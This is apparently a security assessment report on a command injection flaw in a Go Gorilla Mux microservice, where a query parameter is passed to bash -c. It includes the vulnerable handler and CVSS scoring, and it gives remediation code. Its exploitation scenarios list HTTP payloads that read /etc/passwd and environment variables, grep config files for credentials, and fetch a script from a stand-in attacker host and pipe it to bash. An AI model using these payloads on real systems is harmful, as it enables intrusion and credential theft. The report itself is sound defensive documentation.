# Command Injection in Go Microservice via Unsanitized Query Parameters

# Vulnerability Case
During the vulnerability assessment of Acme Corp's microservices written in Go and utilizing the Gorilla Mux framework, we discovered a command injection vulnerability when reviewing the HTTP endpoint logs and source code. The application directly incorporates untrusted query parameters into OS commands executed via Go’s `exec.Command` function without proper sanitization. This flaw allows an attacker to inject arbitrary shell commands by exploiting the `/run` endpoint. Our review indicated that the issue was present in components deployed on Linux-based environments, placing critical production systems at risk.

```go
package main

import (
	"net/http"
	"os/exec"

	"github.com/gorilla/mux"
)

func executeCommand(w http.ResponseWriter, r *http.Request) {
	// Vulnerable pattern: unsanitized user input embedded in a bash command
	userInput := r.URL.Query().Get("cmd")
	output, err := exec.Command("bash", "-c", userInput).CombinedOutput()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.Write(output)
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/run", executeCommand).Methods("GET")
	http.ListenAndServe(":8080", r)
}
```

The vulnerability stems from using the Go `exec.Command` function to execute shell commands with unsanitized input provided via an HTTP query parameter. An attacker can craft requests using special shell characters (such as `;`, `&`, or `|`) to manipulate the command execution flow, potentially executing arbitrary commands on the host system. By exploiting this flaw, an attacker might gain remote code execution, escalate privileges, or exfiltrate sensitive data, leading to a complete system compromise and severe operational impact. Critical business applications and data hosted on Linux servers could be jeopardized, resulting in significant financial and reputational damage.


context: go.gorilla.command-injection.gorilla-command-injection-taint.gorilla-command-injection-taint Untrusted input might be injected into a command executed by the application, which can lead to a command injection vulnerability. An attacker can execute arbitrary commands, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing OS commands with user input. If this is unavoidable, validate and sanitize the input, and use safe methods for executing the commands. In Go, it is possible to use the `exec.Command` function in combination with the `bash -c` command to run the user input as a shell command. To sanitize the user input, you can use a library like `shellescape` to escape any special characters before constructing the command. For more information, see: [Go command injection prevention](https://semgrep.dev/docs/cheat-sheets/go-command-injection/)

# Vulnerability Breakdown
This vulnerability represents a severe OS command injection flaw in a Go microservice built with the Gorilla Mux framework. The application directly passes untrusted user input from HTTP query parameters to a shell command without any sanitization.

1. **Key vulnerability elements**:
   - Direct use of user-supplied input in `exec.Command("bash", "-c", userInput)`
   - No input validation or sanitization
   - Execution through a shell interpreter (bash -c) which processes special characters
   - Exposed via a publicly accessible HTTP endpoint (/run)
   - Deployed on Linux-based production environments

2. **Potential attack vectors**:
   - Chaining commands with semicolons (`;`)
   - Command substitution using backticks (\`) or $() syntax
   - Using pipe operators (`|`) to chain multiple commands
   - Redirecting output to files (`>`) or from files (`<`)
   - Background execution with ampersand (`&`)
   - Network-based remote exploitation requiring no authentication

3. **Severity assessment**:
   - Complete system compromise possible including arbitrary code execution
   - Access to all data and functionality available to the service account
   - Ability to establish persistence and pivot to other systems
   - No special conditions required for exploitation
   - No authentication or user interaction needed

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

# Description
A critical command injection vulnerability has been discovered in Acme Corp's Go-based microservices utilizing the Gorilla Mux framework. The application exposes an HTTP endpoint (`/run`) that accepts a query parameter (`cmd`) and directly passes this user-controlled input to the operating system for execution via Go's `exec.Command` function with a bash shell interpreter.

```go
func executeCommand(w http.ResponseWriter, r *http.Request) {
	userInput := r.URL.Query().Get("cmd")
	output, err := exec.Command("bash", "-c", userInput).CombinedOutput()
	// ... handle output and errors
}

```

This implementation allows attackers to inject arbitrary shell commands by manipulating the `cmd` parameter with special shell characters (`;`, `|`, `&`, etc.). The vulnerability affects production systems running on Linux-based environments and requires no authentication or user interaction, making it trivial to exploit remotely. A successful attack could result in complete system compromise, data exfiltration, or service disruption.

# CVSS
**Score**: 9.8 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H \
**Severity**: Critical

This vulnerability receives a Critical severity rating (CVSS score 9.8) based on the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability is exploitable remotely over the network through an HTTP endpoint, maximizing its accessibility to attackers.

- **Low Attack Complexity (AC:L)**: Exploitation is straightforward, requiring only basic knowledge of shell commands and HTTP requests. No special conditions, timing, or additional information is needed.

- **No Privileges Required (PR:N)**: The vulnerable endpoint appears to be accessible without authentication, allowing unauthenticated attackers to execute commands.

- **No User Interaction (UI:N)**: Exploitation is completely automated and requires no action from users or administrators.

- **Unchanged Scope (S:U)**: While severe, the vulnerability's impact is contained to the vulnerable component itself without directly affecting other components.

- **High Confidentiality Impact (C:H)**: Attackers can access all data accessible to the service account, potentially including configuration files, environment variables, and sensitive business data.

- **High Integrity Impact (I:H)**: Attackers can modify any files writable by the service account, potentially including critical application data, configurations, and system files.

- **High Availability Impact (A:H)**: Attackers can execute commands that crash the service, consume system resources, or otherwise disrupt normal operations.

The combination of trivial remote exploitation with complete system access and no required privileges results in the highest possible CVSS base score for an Unchanged scope vulnerability.

# Exploitation Scenarios
**Scenario 1: Information Gathering and Reconnaissance**
An attacker discovers the vulnerable endpoint and begins by executing basic reconnaissance commands:

```
GET /run?cmd=id HTTP/1.1
Host: acme-microservice.example.com

```

This returns the user context under which the service is running. The attacker follows up with:

```
GET /run?cmd=ls%20-la%20%2F HTTP/1.1
Host: acme-microservice.example.com

```

After mapping the filesystem, the attacker examines configuration files and environment variables:

```
GET /run?cmd=cat%20/etc/passwd%3B%20env HTTP/1.1
Host: acme-microservice.example.com

```

**Scenario 2: Data Exfiltration**
Once the attacker understands the system layout, they locate and exfiltrate sensitive data:

```
GET /run?cmd=find%20/opt%20-name%20%22*.conf%22%20-o%20-name%20%22*.env%22 HTTP/1.1
Host: acme-microservice.example.com

```

The attacker then extracts database credentials from a configuration file:

```
GET /run?cmd=grep%20-E%20"password|user|credential|secret"%20/opt/acme/config/*.yml HTTP/1.1
Host: acme-microservice.example.com

```

**Scenario 3: Establishing Persistence**
The attacker creates a reverse shell to maintain access even if the vulnerability is patched:

```
GET /run?cmd=curl%20-s%20https://attacker.com/payload.sh%20|%20bash HTTP/1.1
Host: acme-microservice.example.com

```

The downloaded script creates a backdoor service, adds SSH keys, or establishes other persistence mechanisms.

**Scenario 4: Lateral Movement**
Using information gathered about the internal network from `/etc/hosts` and environment variables, the attacker pivots to other systems:

```
GET /run?cmd=ping%20-c%201%20internal-db.acme.local HTTP/1.1
Host: acme-microservice.example.com

```

The attacker then uses the compromised server to attack internal services that aren't directly accessible from the internet:

```
GET /run?cmd=curl%20-X%20POST%20-d%20'{"query":"SELECT%20*%20FROM%20users"}'%20http://internal-db.acme.local:8000/query HTTP/1.1
Host: acme-microservice.example.com

```

# Impact Analysis
**Business Impact:**
- Unauthorized access to and exfiltration of sensitive customer data, potentially triggering data breach notification requirements
- Exposure of business-critical intellectual property and proprietary information
- Service disruption leading to downtime and revenue loss
- Regulatory penalties for security violations (GDPR, CCPA, etc.)
- Remediation costs including forensic investigation, system rebuilding, and security enhancements
- Reputational damage and loss of customer trust if a breach becomes public
- Potential legal liability from affected customers or partners

**Technical Impact:**
- Complete compromise of the vulnerable microservice and its data
- Ability to read, modify, or delete any files accessible to the service account
- Execution of arbitrary code within the application environment
- Access to internal network segments normally protected from external access
- Potential for lateral movement to other systems using discovered credentials or trust relationships
- Access to environment variables containing sensitive configuration data and API keys
- Ability to establish persistent backdoors for continued access
- Potential denial of service by consuming resources or deliberately crashing the service
- Creation of covert communication channels through the compromised system
- Modification of application behavior through code or configuration changes

# Technical Details
The vulnerability exists in the `executeCommand` function of a Go microservice that uses the Gorilla Mux framework to expose an HTTP API endpoint at `/run`. This function takes user input directly from the HTTP query parameter `cmd` and passes it to `exec.Command` with a bash shell, allowing arbitrary command execution:

```go
func executeCommand(w http.ResponseWriter, r *http.Request) {
	// Vulnerable pattern: unsanitized user input embedded in a bash command
	userInput := r.URL.Query().Get("cmd")
	output, err := exec.Command("bash", "-c", userInput).CombinedOutput()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.Write(output)
}

```

**Vulnerability Analysis:**

1. **Root Cause**: The application uses the user-supplied `cmd` parameter as an argument to `bash -c` without any validation or sanitization. The bash shell interprets special characters like `;`, `|`, `&`, `>`, `<`, `$(...)`, and backticks as command operators, allowing command injection.

2. **Exploitation Vector**: The `/run` endpoint is accessible via HTTP GET requests, making it remotely exploitable. An attacker only needs to send a specially crafted HTTP request to execute arbitrary commands.

3. **Attack Example**: A request like `GET /run?cmd=id;cat+/etc/passwd` would execute the `id` command followed by `cat /etc/passwd`, returning the output of both commands to the attacker.

4. **Why It's Dangerous**: Using `bash -c` is particularly dangerous because:
   - It invokes a full shell interpreter that processes all shell syntax
   - It allows multiple commands to be chained together
   - It enables command substitution, file redirection, and other shell features
   - It makes sanitization extremely difficult due to the complexity of shell syntax

5. **Technical Impact Details**:
   - Command execution occurs with the privileges of the user running the microservice
   - In containerized environments, this could potentially lead to container escape if combined with other vulnerabilities
   - Output of commands is directly returned to the attacker, facilitating information gathering
   - The service appears to have no input limits, allowing complex and lengthy command payloads

**Exploitation Prerequisites:**
- Network access to the microservice's HTTP endpoint
- Knowledge of the `/run` endpoint and parameter name
- Basic understanding of shell commands

No authentication, session tokens, or special knowledge is required, making this vulnerability trivial to exploit once discovered.

# Remediation Steps
## Remove or Disable the Vulnerable Endpoint

**Priority**: P0

The most immediate action should be to remove or disable the vulnerable `/run` endpoint entirely. This dangerous functionality exposes the system to critical risk and should not be accessible in a production environment.

```go
func main() {
	r := mux.NewRouter()
	// Remove or comment out the dangerous endpoint
	// r.HandleFunc("/run", executeCommand).Methods("GET")
	
	// Other safe endpoints can remain
	r.HandleFunc("/status", getStatus).Methods("GET")
	
	http.ListenAndServe(":8080", r)
}

```

If the functionality is required for legitimate purposes, implement a proper command execution API with strict controls as outlined in the following remediation steps.
## Implement Command Whitelisting with Direct Execution

**Priority**: P1

If command execution functionality is necessary, replace the vulnerable implementation with a whitelist-based approach that explicitly defines allowed operations:

```go
package main

import (
	"net/http"
	"os/exec"
	"strings"

	"github.com/gorilla/mux"
)

// Define a strict mapping of allowed operations to their corresponding commands
var allowedCommands = map[string][]string{
	"disk_usage":  {"df", "-h"},
	"memory_info": {"free", "-m"},
	"uptime":     {"uptime"},
	"hostname":   {"hostname"},
	// Add more allowed commands as needed
}

func executeCommand(w http.ResponseWriter, r *http.Request) {
	// Get the operation name from the request
	operationName := r.URL.Query().Get("operation")
	
	// Check if the requested operation is in the whitelist
	cmdArgs, exists := allowedCommands[operationName]
	if !exists {
		http.Error(w, "Operation not allowed", http.StatusForbidden)
		return
	}
	
	// Execute the command directly without a shell
	// This prevents shell injection attacks
	cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
	
	// Set a timeout for command execution
	// [Implementation depends on Go version]
	
	// Capture and return the output
	output, err := cmd.CombinedOutput()
	if err != nil {
		http.Error(w, "Command execution failed", http.StatusInternalServerError)
		return
	}
	
	w.Write(output)
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/run", executeCommand).Methods("GET")
	http.ListenAndServe(":8080", r)
}

```

This implementation:
1. Defines a whitelist of allowed commands with their exact arguments
2. Executes commands directly without using a shell interpreter (no bash -c)
3. Prevents command injection by not allowing user-controlled command parameters
4. Provides explicit error messages without leaking system details


# References
* CWE-78 | [Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
* CWE-77 | [Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* CWE-116 | [Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html)
